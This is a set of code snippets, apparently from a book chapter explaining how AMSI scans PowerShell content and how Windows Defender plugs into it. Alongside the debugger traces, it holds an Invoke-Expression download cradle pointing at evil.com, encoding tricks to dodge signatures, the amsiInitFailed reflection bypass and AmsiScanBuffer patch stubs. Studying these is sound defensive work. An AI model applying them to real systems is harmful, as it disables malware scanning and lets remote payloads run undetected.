["```\nPS > **Write-Host \"malware\";**\n```", "```\nPS > **Write-Host \"mal\" + \"ware\";**\n```", "```\nPS > **$str = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(**\n**>> \"bWFsd2FyZQ==\"));**\nPS > **Write-Host $str;**\n```", "```\n$key = \"gg\"\n$data = \"CgYLEAYVAg==\"\n$bytes = [System.Convert]::FromBase64String($data);\n\n$decodedBytes = @();\nfor ($i = 0; $i -lt $bytes.Count; $i++) {\n    $decodedBytes += $bytes[$i] -bxor $key[$i % $key.Length];\n}\n$payload = [system.Text.Encoding]::UTF8.getString($decodedBytes);\nWrite-Host $payload;\n```", "```\nPS > **Invoke-Expression (New-Object Net.Webclient).**\n**>> downloadstring(\"****https://evil.com/payloadl.ps1\")**\n```", "```\nSystem.Management.Automation.dll!CompiledScriptBlockData.PerformSecurityChecks()\nSystem.Management.Automation.dll!CompiledScriptBlockData.ReallyCompile(bool optimize)\nSystem.Management.Automation.dll!CompiledScriptBlockData.CompileUnoptimized()\nSystem.Management.Automation.dll!CompiledScriptBlockData.Compile(bool optimized)\nSystem.Management.Automation.dll!ScriptBlock.Compile(bool optimized)\nSystem.Management.Automation.dll!DlrScriptCommandProcessor.Init()\nSystem.Management.Automation.dll!DlrScriptCommandProcessor.DlrScriptCommandProcessor(Script\n    Block scriptBlock, ExecutionContext context, bool useNewScope, CommandOrigin origin,\n    SessionStateInternal sessionState, object dollarUnderbar)\nSystem.Management.Automation.dll!Runspaces.Command.CreateCommandProcessor(ExecutionContext\n    executionContext, bool addToHistory, CommandOrigin origin)\nSystem.Management.Automation.dll!Runspaces.LocalPipeline.CreatePipelineProcessor()\nSystem.Management.Automation.dll!Runspaces.LocalPipeline.InvokeHelper()\nSystem.Management.Automation.dll!Runspaces.LocalPipeline.InvokeThreadProc()\nSystem.Management.Automation.dll!Runspaces.LocalPipeline.InvokeThreadProcImpersonate()\nSystem.Management.Automation.dll!Runspaces.PipelineThread.WorkerProc()\nSystem.Private.CoreLib.dll!System.Threading.Thread.StartHelper.RunWorker()\nSystem.Private.CoreLib.dll!System.Threading.Thread.StartHelper.Callback(object state)\nSystem.Private.CoreLib.dll!System.Threading.ExecutionContext.RunInternal(`--snip--`) System.Private.CoreLib.dll!System.Threading.Thread.StartHelper.Run()\nSystem.Private.CoreLib.dll!System.Threading.Thread.StartCallback()\n[Native to Managed Transition]\n```", "```\nlock (s_amsiLockObject)\n{\n    `--snip--`\n\n    if (s_amsiSession == IntPtr.Zero)\n    {\n      ❶ hr = AmsiNativeMethods.AmsiOpenSession(\n          s_amsiContext,\n          ref s_amsiSession\n        );\n\n        AmsiInitialized = true;\n\n        if (!Utils.Succeeded(hr))\n        {\n            s_amsiInitFailed = true;\n            return AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED;\n        }\n    }\n\n    `--snip--`\n\n    AmsiNativeMethods.AMSI_RESULT result =\n      AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_CLEAN;\n\n    unsafe\n    {\n        fixed (char* buffer = content)\n        {\n          var buffPtr = new IntPtr(buffer);\n        ❷ hr = AmsiNativeMethods.AmsiScanBuffer(\n              s_amsiContext,\n              buffPtr, (uint)(content.Length * sizeof(char)),\n              sourceMetadata,\n              s_amsiSession,\n              ref result);\n      }\n    }\n\n    if (!Utils.Succeeded(hr))\n    {\n      return AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED;\n    }\n    return result;\n}\n```", "```\nif (amsiResult == AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED)\n{\n    var parseError = new ParseError(\n        scriptExtent,\n        \"ScriptContainedMaliciousContent\",\n        ParserStrings.ScriptContainedMaliciousContent);\n ❶ throw new ParseException(new[] {parseError});\n}\n```", "```\nPS > **Write-Host \"malware\"**\nParserError:\nLine |\n    1 | Write-Host \"malware\"\n      | ~~~~~~~~~~~~~~~~~~~~\n      | This script contains malicious content and has been blocked by your\n      | antivirus software.\n```", "```\nBreakpoint 4 hit\namsi!AmsiInitialize+0x1a9:\n00007ff9`5ea733e9 ff15899d0000  call  qword ptr [amsi!_guard_dispatch_icall_fptr] `--snip--`\n\n0:011> **dt OLE32!IID @r8**\n {82d29c2e-f062-44e6-b5c9-3d9a2f24a2df}\n  +0x000 Data1            : 0x82d29c2e\n  +0x004 Data2            : 0xf062\n  +0x006 Data3            : 0x44e6\n  +0x008 Data4            : [8] \"???\"\n\n0:011> **dt @rax**\nATL::CComClassFactory::CreateInstance\n```", "```\n0:011> **kc**\n # Call Site\n00 amsi!AmsiComCreateProviders<IAntimalwareProvider>\n01 amsi!CamsiAntimalware::FinalConstruct\n02 amsi!ATL::CcomCreator<ATL::CcomObject<CamsiAntimalware> >::CreateInstance\n03 amsi!ATL::CcomClassFactory::CreateInstance\n04 amsi!AmsiInitialize\n`--snip--`\n```", "```\n0:011> **u @rip L1**\namsi!AmsiComSecureLoadInProcServer+0x18c:\n00007ff9`5ea75590 48ff1589790000  call    qword ptr [amsi!_imp_RegGetValueW]\n\n0:011> **du @rdx**\n00000057`2067eaa0  \"Software\\Classes\\CLSID\\{2781761E\"\n00000057`2067eae0  \"-28E0-4109-99FE-B9D127C57AFE}\\In\"\n00000057`2067eb20  \"procServer32\"\n```", "```\n0:011> **u @rip L1**\namsi!AmsiComSecureLoadInProcServer+0x297:\n00007ff9`5ea7569b 48ff15fe770000  call    qword ptr [amsi!_imp_LoadLibraryExW] 0:011> **du @rcx**\n00000057`2067e892 \"C:\\ProgramData\\Microsoft\\Windows\"\n00000057`2067e8d2 \" Defender\\Platform\\4.18.2111.5-0\"\n00000057`2067e912 \"\\MpOav.dll\"\n```", "```\n0:011> **dt OLE32!IID @rdx**\n  {82d29c2e-f062-44e6-b5c9-3d9a2f24a2df}\n  +0x000 Data1            : 0x82d29c2e\n  +0x004 Data2            : 0xf062\n  +0x006 Data3            : 0x44e6\n  +0x008 Data4            : [8] \"???\"\n\n0:011> **u @rip L1**\namsi!ATL::CComCreator<ATL::CComObject<CAmsiAntimalware> >::CreateInstance+0x10d:\n00007ff8`0b7475bd ff15b55b0000  call  qword ptr [amsi!_guard_dispatch_icall_fptr]\n\n0:011> **t**\namsi!ATL::CComObject<CAmsiAntimalware>::QueryInterface:\n00007ff8`0b747a20 4d8bc8       mov         r9,r8\n```", "```\nHRESULT AmsiScanBuffer(\n  [in]            HAMSICONTEXT amsiContext,\n  [in]            PVOID        buffer,\n  [in]            ULONG        length,\n  [in]            LPCWSTR      contentName,\n  [in, optional]  HAMSISESSION amsiSession,\n  [out]           AMSI_RESULT  *result\n);\n```", "```\nif (!buffer)\n return 0x80070057;\nif (!length)\n return 0x80070057;\nif (!result)\n return 0x80070057;\nif (!amsiContext)\n return 0x80070057;\nif (*amsiContext != 'ISMA')\n return 0x80070057;\nif (!*(amsiContext + 1))\n return 0x80070057;\nv10 = *(amsiContext + 2);\nif (!v10)\n return 0x80070057;\n```", "```\n0:023> **kc**\n  # Call Site\n00 amsi!CAmsiAntimalware::Scan\n01 amsi!AmsiScanBuffer\n02 System_Management_Automation_ni\n`--snip--`\n```", "```\nHRESULT Scan(\n  [in]  IAmsiStream *stream,\n  [out] AMSI_RESULT *result\n);\n```", "```\n0:000> **kc**\n # Call Site\n00 MPCLIENT!MpAmsiScan\n01 MpOav!DllRegisterServer\n02 amsi!CAmsiAntimalware::Scan\n03 amsi!AmsiScanBuffer\n```", "```\nclass AmsiProvider :\n        public RuntimeClass<RuntimeClassFlags<ClassicCom>,\n        IAntimalwareProvider,\n        FtmBase>\n{\npublic:\n    IFACEMETHOD(Scan)(\n        IAmsiStream *stream,\n        AMSI_RESULT *result\n    ) override;\n\n    IFACEMETHOD_(void, CloseSession)( ULONGLONG session\n    ) override;\n\n    IFACEMETHOD(DisplayName)(\n        LPWSTR *displayName\n    ) override;\n};\n```", "```\nMIDL_INTERFACE(\"3e47f2e5-81d4-4d3b-897f-545096770373\")\nIAmsiStream : public IUnknown\n{\npublic:\n    virtual HRESULT STDMETHODCALLTYPE GetAttribute(\n        /* [in] */ AMSI_ATTRIBUTE attribute,\n        /* [range][in] */ ULONG dataSize,\n        /* [length_is][size_is][out] */ unsigned char *data,\n        /* [out] */ ULONG *retData) = 0;\n\n    virtual HRESULT STDMETHODCALLTYPE Read(\n        /* [in] */ ULONGLONG position,\n        /* [range][in] */ ULONG size,\n        /* [length_is][size_is][out] */ unsigned char *buffer,\n        /* [out] */ ULONG *readSize) = 0;\n};\n```", "```\ntypedef enum AMSI_ATTRIBUTE {\n    AMSI_ATTRIBUTE_APP_NAME = 0,\n    AMSI_ATTRIBUTE_CONTENT_NAME = 1,\n    AMSI_ATTRIBUTE_CONTENT_SIZE = 2,\n    AMSI_ATTRIBUTE_CONTENT_ADDRESS = 3,\n    AMSI_ATTRIBUTE_SESSION = 4,\n    AMSI_ATTRIBUTE_REDIRECT_CHAIN_SIZE = 5,\n    AMSI_ATTRIBUTE_REDIRECT_CHAIN_ADDRESS = 6,\n    AMSI_ATTRIBUTE_ALL_SIZE = 7,\n    AMSI_ATTRIBUTE_ALL_ADDRESS = 8,\n    AMSI_ATTRIBUTE_QUIET = 9 } AMSI_ATTRIBUTE;\n```", "```\nHRESULT AmsiProvider::Scan(IAmsiStream* stream, AMSI_RESULT* result)\n{\n    HRESULT hr = E_FAIL;\n    ULONG ulBufferSize = 0;\n    ULONG ulAttributeSize = 0;\n    PBYTE pszAppName = nullptr;\n\n    hr = stream->GetAttribute(\n        AMSI_ATTRIBUTE_APP_NAME,\n        0,\n        nullptr,\n        &ulBufferSize\n    );\n\n    if (hr != E_NOT_SUFFICIENT_BUFFER)\n    {\n        return hr;\n    }\n\n    pszAppName = (PBYTE)HeapAlloc(\n        GetProcessHeap(),\n        0,\n        ulBufferSize\n    );\n\n    if (!pszAppName)\n    {\n        return E_OUTOFMEMORY;\n    }\n\n    hr = stream->GetAttribute(\n        AMSI_ATTRIBUTE_APP_NAME,\n        ulBufferSize,\n      ❶ pszAppName,\n        &ulAttributeSize\n    ); if (hr != ERROR_SUCCESS || ulAttributeSize > ulBufferSize)\n    {\n        HeapFree(\n            GetProcessHeap(),\n            0,\n            pszAppName\n        );\n\n        return hr;\n    }\n\n    `--snip--`\n}\n```", "```\nHRESULT Read(\n  [in] ULONGLONG      position,\n  [in] ULONG          size,\n  [out] unsigned char *buffer,\n  [out] ULONG         *readSize\n);\n```", "```\nPS > **AmsiScanBuffer**\nAt line:1 char:1\n+ AmsiScanBuffer\n+ ~~~~~~~~~~~~~~\nThis script contains malicious content and has been blocked by your antivirus software.\n  + CategoryInfo : ParserError: (:) [], ParentContainsErrorRecordException\n  + FullyQualifiedErrorId : ScriptContainedMaliciousContent\n\nPS > **\"Ams\" + \"iS\" + \"can\" + \"Buff\" + \"er\"**\nAmsiScanBuffer\n\nPS > **$b = [System.Convert]::FromBase64String(\"QW1zaVNjYW5CdWZmZXI=\")**\nPS > **[System.Text.Encoding]::UTF8.GetString($b)**\nAmsiScanBuffer\n```", "```\nPS > [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').\n>> GetField('amsiInitFailed','NonPublic,Static'.SetValue($null,$true)\n```", "```\nmov eax, 0x80070057 ; E_INVALIDARG\nret\n```", "```\nxor eax, eax ; Zero out EAX\nadd eax, 0x7459104a\nadd eax, 0xbadf00d\nret\n```"]